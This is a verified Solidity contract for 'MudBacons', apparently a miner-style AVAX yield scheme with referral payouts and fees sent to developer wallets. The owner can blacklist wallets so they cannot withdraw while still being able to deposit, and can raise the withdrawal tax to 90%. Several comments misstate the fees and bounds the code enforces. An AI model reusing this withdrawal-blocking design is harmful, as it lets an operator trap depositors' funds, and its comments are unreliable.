/**
 *Submitted for verification at snowtrace.io on 2022-05-07
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.9;


/*
 ________  ___  ________  ________      ___    ___      ________ ___  ________   ________  ________   ________  _______      
|\   __  \|\  \|\   ____\|\   ____\    |\  \  /  /|    |\  _____\\  \|\   ___  \|\   __  \|\   ___  \|\   ____\|\  ___ \     
\ \  \|\  \ \  \ \  \___|\ \  \___|    \ \  \/  / /    \ \  \__/\ \  \ \  \\ \  \ \  \|\  \ \  \\ \  \ \  \___|\ \   __/|    
 \ \   ____\ \  \ \  \  __\ \  \  ___   \ \    / /      \ \   __\\ \  \ \  \\ \  \ \   __  \ \  \\ \  \ \  \    \ \  \_|/__  
  \ \  \___|\ \  \ \  \|\  \ \  \|\  \   \/  /  /        \ \  \_| \ \  \ \  \\ \  \ \  \ \  \ \  \\ \  \ \  \____\ \  \_|\ \ 
   \ \__\    \ \__\ \_______\ \_______\__/  / /           \ \__\   \ \__\ \__\\ \__\ \__\ \__\ \__\\ \__\ \_______\ \_______\
    \|__|     \|__|\|_______|\|_______|\___/ /             \|__|    \|__|\|__| \|__|\|__|\|__|\|__| \|__|\|_______|\|_______|
                                      \|___|/                                                                                
                                                                                                                             
    https://piggyfinance.io
*/

contract MudBacons {
    using SafeMath for uint256;

    /** base parameters **/
    uint256 public BACONS_TO_HIRE_1MINERS = 1440000;
    uint256 public REFERRAL = 70;
    uint256 public PERCENTS_DIVIDER = 1000;
    uint256 public TAX = 10;
    uint256 public MKT = 10;
    uint256 public MARKET_BACONS_DIVISOR = 2;

    uint256 public MIN_INVEST_LIMIT = 5 * 1e17; /** 0.5 AVAX  **/
    uint256 public WALLET_DEPOSIT_LIMIT = 200 * 1e18; /** 200 AVAX  **/

	uint256 public COMPOUND_BONUS = 20;
	uint256 public COMPOUND_BONUS_MAX_TIMES = 10;
    uint256 public COMPOUND_STEP = 12 * 60 * 60;

    uint256 public WITHDRAWAL_TAX = 800;
    uint256 public COMPOUND_FOR_NO_TAX_WITHDRAWAL = 10;

    uint256 public totalStaked;
    uint256 public totalDeposits;
    uint256 public totalCompound;
    uint256 public totalRefBonus;
    uint256 public totalWithdrawn;

    uint256 public marketBacons;
    uint256 PSN = 10000;
    uint256 PSNH = 5000;
    bool public contractStarted;
    bool public blacklistActive = true;
    mapping(address => bool) public Blacklisted;

	uint256 public CUTOFF_STEP = 48 * 60 * 60;
	uint256 public WITHDRAW_COOLDOWN = 4 * 60 * 60;

    /* addresses */
    address public owner;
    address payable public dev;
    address payable public prtnr1;
    address payable public prtnr2;
    address payable public mkt;

    struct User {
        uint256 initialDeposit;
        uint256 userDeposit;
        uint256 miners;
        uint256 claimedBacons;
        uint256 lastHatch;
        address referrer;
        uint256 referralsCount;
        uint256 referralBaconRewards;
        uint256 totalWithdrawn;
        uint256 dailyCompoundBonus;
        uint256 baconCompoundCount; //added to monitor bacon consecutive compound without cap
        uint256 lastWithdrawTime;
    }

    mapping(address => User) public users;

    constructor(address payable _dev, address payable _prtnr1, address payable _prtnr2, address payable _mkt) {
		require(!isContract(_dev) && !isContract(_dev) && !isContract(_prtnr1) && !isContract(_prtnr2) && !isContract(_mkt));
        owner = msg.sender;
        dev = _dev;
        prtnr1 = _prtnr1;
        prtnr2 = _prtnr2;
        mkt = _mkt;
    }

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    function setblacklistActive(bool isActive) public{
        require(msg.sender == owner, "Admin use only.");
        blacklistActive = isActive;
    }

    function blackListWallet(address Wallet, bool isBlacklisted) public{
        require(msg.sender == owner, "Admin use only.");
        Blacklisted[Wallet] = isBlacklisted;
    }

    function blackMultipleWallets(address[] calldata Wallet, bool isBlacklisted) public{
        require(msg.sender == owner, "Admin use only.");
        for(uint256 i = 0; i < Wallet.length; i++) {
            Blacklisted[Wallet[i]] = isBlacklisted;
        }
    }

    function checkIfBlacklisted(address Wallet) public view returns(bool blacklisted){
        require(msg.sender == owner, "Admin use only.");
        blacklisted = Blacklisted[Wallet];
    }

    function startFarm(address addr) public payable{
        if (!contractStarted) {
    		if (msg.sender == owner) {
    		    require(marketBacons == 0);
    			contractStarted = true;
                marketBacons = 144000000000;
                porkBacons(addr);
    		} else revert("Contract not yet started.");
    	}
    }

    //fund contract with AVAX before launch.
    function fundContract() external payable {}

    function porkMoreBacons(bool isCompound) public {
        User storage user = users[msg.sender];
        require(contractStarted, "Contract not yet Started.");

        uint256 baconsUsed = getMyBacons();
        uint256 baconsForCompound = baconsUsed;

        if(isCompound) {
            uint256 dailyCompoundBonus = getDailyCompoundBonus(msg.sender, baconsForCompound);
            baconsForCompound = baconsForCompound.add(dailyCompoundBonus);
            uint256 baconsUsedValue = calculateBaconSell(baconsForCompound);
            user.userDeposit = user.userDeposit.add(baconsUsedValue);
            totalCompound = totalCompound.add(baconsUsedValue);
        } 

        if(block.timestamp.sub(user.lastHatch) >= COMPOUND_STEP) {
            if(user.dailyCompoundBonus < COMPOUND_BONUS_MAX_TIMES) {
                user.dailyCompoundBonus = user.dailyCompoundBonus.add(1);
            }
            //add compoundCount for monitoring purposes.
            user.baconCompoundCount = user.baconCompoundCount.add(1);
        }
        
        user.miners = user.miners.add(baconsForCompound.div(BACONS_TO_HIRE_1MINERS));
        user.claimedBacons = 0;
        user.lastHatch = block.timestamp;

        marketBacons = marketBacons.add(baconsUsed.div(MARKET_BACONS_DIVISOR));
    }

    function sellBacons() public{
        require(contractStarted, "Contract not yet Started.");

        if (blacklistActive) {
            require(!Blacklisted[msg.sender], "Address is blacklisted.");
        }

        User storage user = users[msg.sender];
        uint256 hasBacons = getMyBacons();
        uint256 baconValue = calculateBaconSell(hasBacons);
        
        /** 
            if user compound < to mandatory compound days**/
        if(user.dailyCompoundBonus < COMPOUND_FOR_NO_TAX_WITHDRAWAL){
            //daily compound bonus count will not reset and baconValue will be deducted with 60% feedback tax.
            baconValue = baconValue.sub(baconValue.mul(WITHDRAWAL_TAX).div(PERCENTS_DIVIDER));
        }else{
            //set daily compound bonus count to 0 and baconValue will remain without deductions
             user.dailyCompoundBonus = 0;   
             user.baconCompoundCount = 0;  
        }
        
        user.lastWithdrawTime = block.timestamp;
        user.claimedBacons = 0;  
        user.lastHatch = block.timestamp;
        marketBacons = marketBacons.add(hasBacons.div(MARKET_BACONS_DIVISOR));
        
        if(getBalance() < baconValue) {
            baconValue = getBalance();
        }

        uint256 baconsPayout = baconValue.sub(payFees(baconValue));
        payable(address(msg.sender)).transfer(baconsPayout);
        user.totalWithdrawn = user.totalWithdrawn.add(baconsPayout);
        totalWithdrawn = totalWithdrawn.add(baconsPayout);
    }

     
    /** transfer amount of AVAX **/
    function porkBacons(address ref) public payable{
        require(contractStarted, "Contract not yet Started.");
        User storage user = users[msg.sender];
        require(msg.value >= MIN_INVEST_LIMIT, "Mininum investment not met.");
        require(user.initialDeposit.add(msg.value) <= WALLET_DEPOSIT_LIMIT, "Max deposit limit reached.");
        uint256 baconsBought = calculateBaconBuy(msg.value, address(this).balance.sub(msg.value));
        user.userDeposit = user.userDeposit.add(msg.value);
        user.initialDeposit = user.initialDeposit.add(msg.value);
        user.claimedBacons = user.claimedBacons.add(baconsBought);

        if (user.referrer == address(0)) {
            if (ref != msg.sender) {
                user.referrer = ref;
            }

            address upline1 = user.referrer;
            if (upline1 != address(0)) {
                users[upline1].referralsCount = users[upline1].referralsCount.add(1);
            }
        }
                
        if (user.referrer != address(0)) {
            address upline = user.referrer;
            if (upline != address(0)) {
                uint256 refRewards = msg.value.mul(REFERRAL).div(PERCENTS_DIVIDER);
                payable(address(upline)).transfer(refRewards);
                users[upline].referralBaconRewards = users[upline].referralBaconRewards.add(refRewards);
                totalRefBonus = totalRefBonus.add(refRewards);
            }
        }

        uint256 baconsPayout = payFees(msg.value);
        totalStaked = totalStaked.add(msg.value.sub(baconsPayout));
        totalDeposits = totalDeposits.add(1);
        porkMoreBacons(false);
    }

    function payFees(uint256 baconValue) internal returns(uint256){
        uint256 tax = baconValue.mul(TAX).div(PERCENTS_DIVIDER);
        uint256 mktng = baconValue.mul(MKT).div(PERCENTS_DIVIDER);
        dev.transfer(tax.mul(2));
        prtnr1.transfer(tax);
        prtnr2.transfer(tax);
        mkt.transfer(mktng);
        return mktng.add(tax.mul(5));
    }

    function getDailyCompoundBonus(address _adr, uint256 amount) public view returns(uint256){
        if(users[_adr].dailyCompoundBonus == 0) {
            return 0;
        } else {
            uint256 totalBonus = users[_adr].dailyCompoundBonus.mul(COMPOUND_BONUS); 
            uint256 result = amount.mul(totalBonus).div(PERCENTS_DIVIDER);
            return result;
        }
    }

    function getUserInfo(address _adr) public view returns(uint256 _initialDeposit, uint256 _userDeposit, uint256 _miners,
     uint256 _claimedBacons, uint256 _lastHatch, address _referrer, uint256 _referrals,
	 uint256 _totalWithdrawn, uint256 _referralBaconRewards, uint256 _dailyCompoundBonus, uint256 _baconCompoundCount, uint256 _lastWithdrawTime) {
         _initialDeposit = users[_adr].initialDeposit;
         _userDeposit = users[_adr].userDeposit;
         _miners = users[_adr].miners;
         _claimedBacons = users[_adr].claimedBacons;
         _lastHatch = users[_adr].lastHatch;
         _referrer = users[_adr].referrer;
         _referrals = users[_adr].referralsCount;
         _totalWithdrawn = users[_adr].totalWithdrawn;
         _referralBaconRewards = users[_adr].referralBaconRewards;
         _dailyCompoundBonus = users[_adr].dailyCompoundBonus;
         _baconCompoundCount = users[_adr].baconCompoundCount;
         _lastWithdrawTime = users[_adr].lastWithdrawTime;
	}

    function getBalance() public view returns(uint256){
        return address(this).balance;
    }

    function getTimeStamp() public view returns (uint256) {
        return block.timestamp;
    }

    function getAvailableEarnings(address _adr) public view returns(uint256) {
        uint256 userBacons = users[_adr].claimedBacons.add(getBaconsSinceLastHatch(_adr));
        return calculateBaconSell(userBacons);
    }

    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256){
        return SafeMath.div(
                SafeMath.mul(PSN, bs), 
                    SafeMath.add(PSNH, 
                        SafeMath.div(
                            SafeMath.add(
                                SafeMath.mul(PSN, rs), 
                                    SafeMath.mul(PSNH, rt)), 
                                        rt)));
    }

    function calculateBaconSell(uint256 bacons) public view returns(uint256){
        return calculateTrade(bacons, marketBacons, getBalance());
    }

    function calculateBaconBuy(uint256 eth,uint256 contractBalance) public view returns(uint256){
        return calculateTrade(eth, contractBalance, marketBacons);
    }

    function calculateBaconBuySimple(uint256 eth) public view returns(uint256){
        return calculateBaconBuy(eth, getBalance());
    }

    /** How many miners and bacons per day user will recieve based on AVAX deposit **/
    function getBaconsYield(uint256 amount) public view returns(uint256,uint256) {
        uint256 baconsAmount = calculateBaconBuy(amount , getBalance());
        uint256 miners = baconsAmount.div(BACONS_TO_HIRE_1MINERS);
        uint256 day = 1 days;
        uint256 baconsPerDay = day.mul(miners);
        uint256 earningsPerDay = calculateBaconSellForYield(baconsPerDay, amount);
        return(miners, earningsPerDay);
    }

    function calculateBaconSellForYield(uint256 bacons, uint256 amount) public view returns(uint256){
        return calculateTrade(bacons, marketBacons, getBalance().add(amount));
    }

    function getSiteInfo() public view returns (uint256 _totalStaked, uint256 _totalDeposits, uint256 _totalCompound, uint256 _totalRefBonus) {
        return (totalStaked, totalDeposits, totalCompound, totalRefBonus);
    }

    function getMyMiners() public view returns(uint256){
        return users[msg.sender].miners;
    }

    function getMyBacons() public view returns(uint256){
        return users[msg.sender].claimedBacons.add(getBaconsSinceLastHatch(msg.sender));
    }

    function getBaconsSinceLastHatch(address adr) public view returns(uint256){
        uint256 secondsSinceLastHatch = block.timestamp.sub(users[adr].lastHatch);
                            /** get min time. **/
        uint256 cutoffTime = min(secondsSinceLastHatch, CUTOFF_STEP);
        uint256 secondsPassed = min(BACONS_TO_HIRE_1MINERS, cutoffTime);
        return secondsPassed.mul(users[adr].miners);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

    function CHANGE_OWNERSHIP(address value) external {
        require(msg.sender == owner, "Admin use only.");
        owner = value;
    }

    /** percentage setters **/

    // 2592000 - 3%, 2160000 - 4%, 1728000 - 5%, 1440000 - 6%, 1200000 - 7%
    // 1080000 - 8%, 959000 - 9%, 864000 - 10%, 720000 - 12%
    
    function PRC_BACONS_TO_HIRE_1MINERS(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 479520 && value <= 720000); /** min 3% max 12%**/
        BACONS_TO_HIRE_1MINERS = value;
    }

    function PRC_TAX(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value <= 25);
        TAX = value;
    }

    function PRC_MKT(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value <= 20);
        MKT = value;
    }

    function PRC_REFERRAL(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 10 && value <= 100);
        REFERRAL = value;
    }

    function PRC_MARKET_BACONS_DIVISOR(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value <= 50);
        MARKET_BACONS_DIVISOR = value;
    }

    function SET_WITHDRAWAL_TAX(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value <= 900);
        WITHDRAWAL_TAX = value;
    }

    function BONUS_DAILY_COMPOUND(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 10 && value <= 900);
        COMPOUND_BONUS = value;
    }

    function BONUS_DAILY_COMPOUND_BONUS_MAX_TIMES(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value <= 30);
        COMPOUND_BONUS_MAX_TIMES = value;
    }

    function BONUS_COMPOUND_STEP(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value <= 24);
        COMPOUND_STEP = value * 60 * 60;
    }

    function SET_INVEST_MIN(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        MIN_INVEST_LIMIT = value * 1e17;
    }

    function SET_CUTOFF_STEP(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        CUTOFF_STEP = value * 60 * 60;
    }

    function SET_WITHDRAW_COOLDOWN(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        require(value <= 24);
        WITHDRAW_COOLDOWN = value * 60 * 60;
    }

    function SET_WALLET_DEPOSIT_LIMIT(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        require(value >= 10);
        WALLET_DEPOSIT_LIMIT = value * 1 ether;
    }
    
    function SET_COMPOUND_FOR_NO_TAX_WITHDRAWAL(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value <= 12);
        COMPOUND_FOR_NO_TAX_WITHDRAWAL = value;
    }
}

library SafeMath {

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b != 0);
    return a % b;
  }
}